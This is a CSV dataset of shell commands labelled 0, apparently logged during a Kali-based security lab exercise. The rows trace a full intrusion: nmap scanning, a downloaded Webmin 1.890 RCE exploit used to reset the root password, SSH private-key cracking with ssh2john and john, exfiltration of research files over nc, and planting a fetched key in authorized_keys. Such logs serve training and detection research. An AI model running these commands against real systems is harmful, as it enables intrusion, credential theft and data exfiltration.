value,target
grep ssh .bash_history,0
cat sshlab,0
cd ssh lab,0
cat .ssh/config,0
scp ~/.ssh/Y29yb25h,0
scp ~/.ssh/Y29yb25h kali@10.1.135.83/home,0
scp chong@server:~/.ssh/Y29yb25h .,0
cd /home/chong/.ssh,0
vim Y29yb25h,0
nano Y26yb25h,0
cp $(locate ssh2john.py) .,0
python ssh2john.py Y29yb25h > Y29yb25h.hash,0
john Y29yb25h.hash --wordlist=/usr/share/wordlists/fasttrack.txt,0
cd \n,0
cd /usr/share/wordlists/,0
cd,0
su root,0
cp,0
nano,0
nano Y29yb25h,0
cd research,0
nmap,0
metasploit,0
msf,0
nmap 10.1.26.9 -p 10000 -sV,0
echo $HISTFILE,0
cat /root/.bash_history,0
cd /root,0
cd /,0
history,0
sudo less /root/.bash_history,0
tail /var/log/auth.log,0
cat /var/log/auth.log,0
cd /home,0
sudo cat .bash_history,0
"sudo cat .bash_history | grep ""ssh""",0
find . lab,0
cd..,0
cd ssh,0
find . -name lab,0
cat /.ssh/config,0
sudo cat /.ssh/config,0
sudo cat ~/.ssh/config,0
cat /etc/ssh/ssh_config,0
ls /.ssh/,0
sudo ls /.ssh,0
cat /.ssh,0
sudo cat .ssh/config,0
cat ~/.ssh/Y29yb25h,0
sudo cat ~/.ssh/Y29yb25h,0
sudo cat .ssh/Y29yb25h,0
sudo cat /.ssh/Y29yb25h,0
ls Downloads,0
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py,0
python,0
touch sshtocrack,0
vim sshtocrack,0
python ssh2john.py sshtocrack > tocrack,0
john --wordlist=/usr/share/wordlists/fasttrack.txt tocrack,0
ssh -i sshtocrack chong@10.1.17.4,0
chmod 775 sshtocrack,0
chmod 400 sshtocrack,0
cat research-0.data,0
cat research-2.data,0
cat research-3.data,0
cat research-4.data,0
cat research-5.data,0
cat research-6.data,0
cat research-7.data,0
cat research-8.data,0
cat research-19.data,0
cat research-18.data,0
cat research-17.data,0
cat research-16.data,0
cat research-15.data,0
cat research-14.data,0
cat research-13.data,0
cat research-12.data,0
cat research-11.data,0
cat research-10.data,0
cat research-9.data,0
nFckqMhVYwYHrfumNeujwTypEErJqfOzEotNPblwh\nAErDVyasmvfCEaAlqfsodHipGqeehQmapBlvGofIlIUFPuVRIhqyNgFAZypMeECz\nHfFtRVaXTMRvaDflXlDGRjPqWfJwUJFdmgcbbhUYWapixxENnyQa\nCLgRPSjkRsgPYwZjagiEsDTppjScGYKcihVldlCvWFQkwPeQnnbgsPnWRrgHHopHYChj\nEJfPapFJpmaJLfMYwdftSNUfEAcqPUClKTkzUsVPYANF\nNydyczFEovUIOIkVOfsQKGgfzVVcuYSBNTXkKItJBnZMawJf\nmHZGNAivDHGxYcSMCVSybEvKCIttNQPVXgtXhrXrPoXBiYFjrkQQlmcEIiQytYqYdZeihyzr\nfJcjPXtEQnZdqHrbtubbQhMvslFQIvvlmZWXLJGLPUzFkKAadH\nBNYEIHBLEVaJoKvZfHqwfYzTAJEVoNSIRJXcfgtOKitwNDqtzuox\nnbjsjnhHZcZgPbtjmIDzuWBcXvSUrjljYDzEynOBQEnRDTMNWXFb\nrnrJQXgrMPIELhinFkjsZkoKkHPTNSKVwVepijWZpahluTVFMD\nDkwoayCAseSglXhnYSdBpSRRvEoHAQkWrqotzvNYmsKfUOSwoiw\nCuXbtfBiDIRynOkuzAbrixRZGFnnnvqLFyjfLnvzHexyGIOIVVYLFXVlAcjPQTRxcn\nMXlJenWBeApJvWkdbw,0
cat cure,0
nmap -p 10000 -sV,0
past,0
cd /usr/share/wordlists,0
cat fasttrack.txt,0
cp $(locate ssh2john.py),0
man cp,0
python Y29yb25h,0
locate ssh2john.py,0
localhost 4444\,0
localhost 4444,0
ls /home/kali,0
sudo su,0
nmap -v -sn 10.1.26.9.,0
nmap -v -sn 10.1.26.9,0
nmap -vv 10.1.26.9,0
nmap -V 10.1.26.9,0
nmap -v -A 10.1.26.9,0
shell,0
use exploit/unix/webapp/webmin_backdoor,0
use,0
nano /home/chong/READ-ME.txt\n,0
cat /home/chong/.bash_history,0
grep --help,0
grep /home/chong/.bash_history,0
"grep -i ""ssh"" /home/chong/.bash_history",0
cat /home/chong/.ssh,0
cat /home/chong/.ssh/,0
cd /home/chong/.ssh/,0
cat 0hRGen1s,0
john,0
cp /home/chong/.ssh/Y29yb25h /home/kali/,0
cp /home/chong/.ssh/Y29yb25h /home/kali,0
scp root@server:/home/chong/.ssh/Y29yb25h /home/kali/,0
ssh2john.py sshkey.txt,0
./ssh2john.py sshkey.txt,0
.ssh2john.py sshkey.txt,0
ssh2john.py,0
./ssh2john.py,0
john --wordlists=/fasttrack.txt --rules converted.txt,0
john --wordlists=./fasttrack.txt --rules converted.txt,0
john --wordlist=/fasttrack.txt --rules converted.txt,0
john --wordlist=fasttrack.txt --rules converted.txt,0
su chongg,0
cat .cure,0
researchers,0
./researchers,0
ping 10.1.26.9,0
nmap -sp 10.1.26.9,0
nmap -O 10.1.26.9,0
nmap -p 80 10.1.26.9,0
nmap -p 10000 10.1.26.9,0
localhost,0
usr,0
cd usr,0
cd /usr/share,0
cd wordlists,0
cd usr/share/john,0
cd ../,0
cd local,0
cd Desktop,0
"python sshjohn.py ""asd"" > ""john_rsa""",0
ifconfig,0
clear,0
nmap -sp -v 10.1.26.9,0
nmap -sp -O -v 10.1.26.9,0
su,0
sudo nmap -O -v 10.1.26.9,0
nmap -O -v 10.1.26.9,0
sudo nmap -p 10000 -v 10.1.26.9,0
nmap -p 10000 -v 10.1.26.9,0
nmap -p 10000 -sV -v 10.1.26.9,0
metasplit --version,0
metasploit --version,0
msf6,0
msfdb --version,0
sudo msfdb init,0
sudo msfdb start,0
msfconsole --version,0
sudo msfconsole,0
pwd,0
cd kali,0
cd Download,0
cd Downloads,0
sudo john,0
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt Y29yb25h,0
./ssh2john.py Y29yb25h,0
cat sshkey.parsed,0
./ssh2john.py Y29yb25h > sshkey.parsed,0
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt sshkey.parsed,0
ssh chong@10.1.17.4,0
ssh --version,0
ssh -h,0
ssh chong@219.169.69.246,0
nmap 219.169.69.246,0
nmap 10.1.17.4,0
exit,0
cat recv.py,0
./recv.sh,0
cat recv.sh,0
cat nohup.out,0
rm nohup.out,0
ls -ala,0
ls -la,0
scan,0
recv.sh,0
./recv,0
bash recv.sh,0
nmap -sC 10.1.26.9,0
nmap -sC 10.1.26.9 -p 10000,0
nmap -sV 10.1.26.9 -p 10000,0
nmap -p 10000 -sV 10.1.26.9,0
nmap -A  10.1.26.9,0
nmap -sV -p 10.1.26.9 10000,0
apt list --installed,0
cd home/chong,0
ears.cd home/chong,0
cd ./ssj,0
cd ./ssh,0
vum Y29yb25h,0
ssh 10.1.26.9,0
python ssh2john.py file > file.hash,0
john file.hash --wordlist=/usr/share/wordlist/fasttrack.txt,0
john file.hash --wordlist=/usr/share/wordlists/fasttrack.txt,0
nmap ...,0
nmap -v -A ...,0
nmap -v -A 10#010.1.26.9,0
nmap -v -A ...~,0
nikto -h 10.1.26.9,0
nikto -h 10.1.26.9 -p #033[2~#033[2~,0
nikto -h ... -p 10000,0
nikto -h 10.1.26.9 -p 10000,0
man metasploit,0
~msfconsole,0
cd /home/chong; ls,0
head -n  READ-ME.txt,0
head -n 1 READ-ME.txt,0
catY29yb25h,0
vim .key,0
cd /etc/share/wordlists,0
john .key -wordlist=/usr/share/wordlist/fasttrack.txt,0
cp $(locate sshjohn.py) .,0
python ssh2john.py .ket > .keyj,0
john .keyj -wordlist=/usr/share/wordlist/fasttrack.txt,0
python ssh2john.py .key > .keyj,0
john .keyj -wordlist=/usr/share/wordlists/fasttrack.txt,0
.ssh chong:..,0
ssh chong:10.1.17.4,0
h chong@N,0
ssh chong@lab,0
ess config,0
ssh chong@,0
ssh chong@147.251.48.1,0
su - chong,0
ssh chong@server,0
nc localhost,0
cat  *  |  grep cure,0
nmap 10.1.26.9 -sV,0
nmap 10.1.26.9 -sV -p 10000,0
wget https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py,0
python3 webmin-1.890_exploit.py,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 who,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 whoami,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 cat /home/chong/READ-ME.txt,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 'cat /home/chong/READ-ME.txt',0
"python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo ""est""'",0
"python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo ""password"" | passwd --stdin root'",0
ssh root@10.1.26.9,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 'cat /etc/passwd',0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 'passwd -d root',0
ip a,0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 'passwd -S root',0
python3 webmin-1.890_exploit.py 10.1.26.9 10000 'whoami',0
"python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo ""root:password""| chpasswd'",0
"python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo ""root:password"" | chpasswd'",0
cat /etc/passwd,0
ssh root@10.1.26.9 -vvv,0
ls -lah,0
ls /home/kali/.ssh,0
ls -la /home/kali/.ssh,0
cat /etc/shadow,0
ls -al /home/kali/.ssh,0
cp Y29yb25h bpk,0
locate,0
locate ssh2john,0
scp root@10.1.26.9:/home/chong/.ssh/Y9yb25h .,0
scp root@10.1.26.9:/home/chong/.ssh/* .,0
python /usr/share/john/ssh2john.py Y29yb25h >ke.hash,0
cat ke.hash,0
locate rock,0
locate rockyou,0
locate rockyou.txt,0
john ke.hash,0
locate rockyou.txt.gz,0
ls /usr/share/wordlists/fasttrack.txt,0
ls -lh /usr/share/wordlists/fasttrack.txt,0
cat /usr/share/wordlists/fasttrack.txt,0
john ke.hash -wordlist=/usr/share/wordlists/fasttrack.txt,0
ssh chong@10.1.17.4 -i Y29yb25h,0
scp -i Y29yb25h  chong@0.1.17.4:/home/chong/research/* ./research/,0
scp -i Y29yb25h  chong@10.1.17.4:/home/chong/research/* ./research/,0
scp -i Y29yb25h  chong@10.1.17.4:/home/chong/research/* ./research/.,0
mkdir research,0
cat,0
cat *,0
ll,0
cat research-1.data,0
ssh,0
vim /home/kali/.ssh/authorized_keys,0
su kali,0
re,0
rese,0
locate researchers,0
whereis researchers,0
cat .bashrc,0
sudo researchers,0
last,0
sudo tcpdump port 22,0
netstat -tulpn,0
hostname,0
python3 /home/kali/recv.py & disown,0
nScpzsyBJCGBleyobJWSVPOSnLdHcprnpgBZbbgAhjZPpjNKPjYYDHhf,0
file research-0.data,0
cat * > cure,0
cat * >cure1,0
nc localhost 4444 < cure1,0
nc localhost 4444 < research-19.data,0
nc localhost 4444 < research-18.data,0
nc localhost 4444 < research-17.data,0
nc localhost 4444 < research-16.data,0
nc localhost 4444 < research-15.data,0
nc localhost 4444 < research-14.data,0
nc localhost 4444 < research-13.data,0
nc localhost 4444 < research-12.data,0
nc localhost 4444 < research-11.data,0
nc localhost 4444 < research-10.data,0
nc localhost 4444 < research-9.data,0
nc localhost 4444 < research-0.data,0
scp -i Y29yb25h  chong@10.1.17.4:/home/chong/research/.* .,0
scp -i ../Y29yb25h  chong@10.1.17.4:/home/chong/research/.* .,0
nc localhost 4444 < .cure.data,0
wget http://files.berkasimon.com/pubk,0
cat pubk,0
nano authorized_eys,0
nano authorized_keys,0
cat authorized_keys,0
sudo cat /etc/passwd,0
nmap -h,0
nmap 10.1.26.9 -p10000,0
nmap 10.1.26.9 -p 10000,0
nmap 10.1.26.9 -sV  -p10000,0
nmap 10.1.26.9  -p10000 -sV,0
msfonsole,0
mscfonsole,0
msfconsole - h,0
msfconsole -h,0
use exploit/unix/webapp/webmin/backdoor,0
msfconsole use exploit/unix/webapp/webmin/backdoor,0
cd .bash_history,0
cd ~/.bash_history,0
less /.bash_history,0
less .bash_history,0
less ~/.bash_history,0
cd ~/usr/share/wordlist,0
cd ~/usr/,0
cd ../usr/,0
cd ~/,0
cd ./,0
vim,0
python ssh@john.py Y29yb25h > Y29yb25h.hash,0
john Y29yb25h.hash -- wordlist=/usr/share/wordlists/fasttrack.txt,0
nano /usr/share/wordlists/fasttrack.txt,0
car .cure-data,0
nc localhost $$$$,0
wpscan -h,0
nmap -A 10.1.26.9,0
wpsan 10.1.26.9,0
wpscan 10.1.26.9,0
commix -help,0
commix,0
cp $(locate ssh2john\.py),0
namap -sP 10.1.26.9,0
nmap -sP 10.1.26.9,0
nmap -sV 10.1.26.9 -A,0
ls /home/attacker,0
cd Documents,0
vim key,0
vi key,0
ls /usr/share/wordlists,0
john --wordlist=/usr/share/wordlists/fasttrack.txt -h,0
john --wordlist=/usr/share/wordlists/fasttrack.txt --help,0
ssh2kali,0
ssh2kali.py,0
cd  Documents,0
python /usr/share/john/ssh2john.py key > key.hash,0
john --wordlist=/usr/share/wordlists/fasttrack.txt key.hash,0
ssh -i key chong@10.1.17.4,0
chmod 700 key,0
ulGhGyzYACGRpXknshrKEJnShDUuMbXjaRFGnJHRpBMPk\nmVBEZJbgTwVduVbOXnqeCTQoomrvYsnEwRXVDeiobYIvENYpErdtWOCzBcxOQFFeMVWqwbTeBz\nyCZMebsNIQksiuQygOyaWZOdtBihTiYZTzjBBIvpRLP\nuEjmhzirkRzFheIADMJxCXGLlkPuUCyLksQUVVVoTkklntpTsgddSMzHApUBAvlXYBYwvkeZHsla\nxJVvlitOgdAnDtUrOyMxMUQSCiNdxBwtfjlpmqfJSYvQPOVmbnDvxuBchAzUnKJTHfmzxhHysZtFf\njmnDjnaRRiWoeSsMOFhsNkayhMJWeqKzgPZIIFuzUAbmfHAVCVTqHriQrLFxIvfcHKP\nfleNZyChLfodlytCnajjKpldnmMqinABHHpsYGAAxIYzAyzxUuIkgYvwzziBGrXTIbtDpKNqyxrOjQD\nuJfIMTTaxEjsFYujHXHQIsTceuwNrnENftVaxNhvwRfPpZdGsWfDoFEJsxP\nftAAdNovYSzKDYPRsfmcSKDbVADbBZNvcFVSVigIrfIBSExhPHlVqHeHmwjpEZ\nIVicSKjSBFvXjhIuHbgKOsiLqEWgDQBUGWtzqAQzgVndOVsQyScaSgfHwZrgy,0
cat research-* > out,0
cat out,0
nmap svvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv,0
nmap -sn -P22 10.1.26.9,0
nmap -sn -PS22 10.1.26.9,0
nmap --help,0
nmap --script=vuln 10.1.26.9,0
metasploit --help,0
nc -l -p 1234 > out.txt,0
rm out.txt,0
nc -l -p 1234 > id_rsa,0
vim id_rsa,0
ls -l,0
nc -l -p 51071 > id_rsa,0
rm id_rsa,0
cksum id_rsa,0
python /user/share/john/ssh2john.py id_rsa id_rsa.hash,0
python /usr/share/john/ssh2john.py id_rsa id_rsa.hash,0
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash,0
cd usr/share/,0
cd /usr/share/,0
cd ../..,0
cd /home/kali,0
cd debian/,0
gunzip /usr/share/wordlist,0
gunzip /usr/share/wordlist/rockyou.txt.gz,0
gunzip /usr/share/wordlists/rockyou.txt.gz,0
cp /usr/share/wordlists/rockyou.txt,0
cp /usr/share/wordlists/rockyou.txt .,0
john id_rsa.hash -wordlists=rockyou.txt,0
john id_rsa.hash -wordlist=rockyou.txt,0
ssh 10.1.17.4,0
ssh --help,0
ssh bob@10.1.17.4 -i id_rsa,0
chmod 600 id_rsa,0
cd Documents/,0
cd health/,0
sha,0
sham512,0
sha512 sum,0
sha512,0
sha512sum,0
sha512sum health/,0
sha512sum health/*,0
sha512sum health/* | grep 206ce87678,0
sha512sum ./* | grep 206ce87678,0
sha512sum Documents/* | grep 206ce87678,0
sha512sum social/* | grep 206ce87678,0
sha512sum home/* | grep 206ce87678,0
cd private,0
cd Docs/,0
find --help,0
xargs --help,0
find * | xargs sha512sum | grep 206ce87678,0
find ./ | xargs sha512sum | grep 206ce87678,0
cat ./email/work/CEOMNlPM,0
ip config,0
ipconfig,0
ip help,0
ip,0
connect,0
nmap -sL,0
nmap -sL 10.1.26.9:5050,0
nmap -v -sn 10.1.26.9:5050,0
nmap  10.1.26.9,0
ip localhost:10000,0
nsf,0
run,0
msf5,0
cat best_key,0
cd /john,0
$ /usr/sbin/john best_key,0
/usr/sbin/mailer best_key,0
john best_key,0
unafs,0
unshadow,0
python ssh2john.py best_key > best_key.hash,0
python /usr/share/john/ssh2john.py best_key > best_key.hash,0
john best_key.hash /usr/share/wordlists/fasttrack.txt,0
john best_key.hash --wordlist=/usr/share/wordlists/fasttrack.txt,0
cat best_key.hash,0
ssh Iwillcrushyou@10.1.26.9,0
ssh Iwillcrushyou@10.1.17.4,0
ssh -i best_key Iwillcrushyou@10.1.17.4,0
chmod 400 best_key,0
nmap -sV,0
nmap -Pn --script vuln 10.1.26.9,0
nmap -sV --script=vuln 10.1.2,0
nmap -sV --script=vuln 10.1.26.9,0
mfs,0
mfsconsole,0
cat id_rsa,0
locate sshjohn.py,0
cp $(locate sshjohn.py),0
python sshjohn.py id_rsa > id_rsa.hash,0
python ssh2john.py id_rsa > id_rsa.hash,0
cp $(locate rockyou.txt) .,0
gunzip rockyou.txt.gz,0
john id_rsa.hash -worlist=rockyou.txt,0
chmod 644,0
chmod 600 id_rsa.hash,0
ssh -i id_rsa.hash bob@10.1.17.4,0
ssh -i id_rsa bob@10.1.17.4,0
cd health,0
ls social,0
ld,0
cd work,0
cd email,0
sha512sum /* | grep 206ce87678,0
sha512sum * | grep 206ce87678,0
cat CEOMNlPM,0
nmap 192.168.128.49,0
nmap -v 192.168.128.49,0
nmap -V ..,0
nmap -v 192.168.128.49.,0
nmap -v 10.1.26.9,0
nmap -sV=vulscan-vulscan.nse  10.1.26.9,0
nmap 10.1.26.9 --script=vuln,0
dir,0
find / hoax.txt,0
find -f hoax.txt,0
find / -f hoax.txt,0
find / -type f -name hoax.txt,0
"find / -type f -name ""*.txt""",0
"find / -type f -name ""hoax.txt""",0
webmin,0
websearch,0
./msfconsole,0
cp /usr/share/worldlists/rockyou.txt.gz,0
cp /usr/share/john/ssh2john.py,0
cp /usr/share/john/ssh2john.py .,0
python ssh2john.py id_rsa > hash,0
john hash -worldlist=rockyou.txt,0
john hash -wordlist=rockyou.txt,0
sha512sum /home/private/Documents/Docs/email/work/* | grep 206ce87678,0
cat /home/private/Documents/Docs/email/work/CEOMNlPM,0
nmap 10.1.26.9:5050,0
cd /usr/share/john,0
cd Dowloads,0
cd Downloads/,0
cd best_key,0
/usr/share/john/ssh2john.py best_key > best?key.hash,0
/usr/share/john/ssh2john.py best_key > best_key.hash,0
/usr/share/john/john.exe /usr/share/worldlists/fastcrack.txt best_key.hash,0
john --wordlist=/usr/share/worldlists/fastcrack.txt best_key.hash,0
john --wordlist=/usr/share/worldlists/fasttrack.txt best_key.hash,0
john --wordlist=/usr/share/wordlists/fasttrack.txt best_key.hash,0
su Iwillcrushyou,0
ssh Iwillcrushyou,0
ssh -i ./.ssh/best_key 10.1.17.4,0
ssh -i /.ssh/best_key Iwillcrushyou@client,0
ssh -i ./.ssh/best_key Iwillcrushyou@client,0
chmod 600 best_key,0
ls -al,0
nmap -sL -sS 10.1.26.9,0
nmap -sS 10.1.26.9,0
vim probe,0
Show exploits,0
mkdir keys,0
curl http://ix.io/2IY2 > new_key && chmod 600 new-key,0
chmod 600 new_key,0
mv new_key new-key,0
john --single /root/keys/id_rsa,0
ssh2john.py keys/id_rsa > processed-for-john,0
john --wordlist=/usr/share/wordlists/most_common_passwords.txt --format=SSH processed-for-john,0
nmap -p- 10.1.26.9,0
nc --help,0
nc -h,0
nc 10.1.26.9 -p 10000,0
nmap -p- 10.1.26.9 -sC,0
crc32,0
cksum,0
cksum -h,0
cksum --help,0
pwpd,0
cd Desktop/,0
cksum ssh-key.txt,0
nc -u -l 9999,0
nc -u -l -p 9999,0
nc -u -l -p 9999 -q 1 > keyfile,0
rm keyfile,0
rm ssh-key.txt,0
l,0
netstat - lepunt,0
man stat,0
man netstat,0
tmux,0
EXIT,0
vim most_common_passwords_of_my_enemies.txt,0
nmap 10.1.26.9 -A,0
nmap 10.1.26.9 -A -V,0
nmap 10.1.26.9 -A -v,0
ls -lR,0
LS,0
cat most_common_passwords_of_my_enemies.txt,0
cd /etc/,0
ls media,0
"find . ""module""",0
"find . ""metasploit""",0
ls lib,0
"find . ""s/metasploit/""",0
find / -name metasploit,0
cat /usr/share/metasploit-framework/lib/msf/core/modules/external/python/metasploit,0
cat /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit,0
find / -name metasploit -executable,0
man find,0
find / -name metasploit -type f,0
find / -name metasploit -type e,0
cat /usr/lib/python2.7/dist-packages/faraday/client/plugins/repo/metasploit,0
ls /usr/lib/python2.7/dist-packages/faraday/client/plugins/repo/metasploit,0
cat /usr/lib/python2.7/dist-packages/faraday/client/plugins/repo/metasploit/plugin.py,0
searchsploit webmin 1.920,0
cat exploits/linux/webapps/47293.sh,0
man msfconsole,0
vim exploits/linux/webapps/47293.sh,0
john --wordlist=most_common_passwords_of_my_enemies.txt /temp/id_rsa,0
cat /temp/id_rsa,0
cd /temp,0
ls home,0
ls home/debian/,0
ls tmp,0
cat tmp/id_rsa,0
john --wordlist=most_common_passwords_of_my_enemies.txt temp/id_rsa,0
john temp/id_rsa --wordlist=most_common_passwords_of_my_enemies.txt,0
.\john.exe temp/id_rsa --wordlist=most_common_passwords_of_my_enemies.txt,0
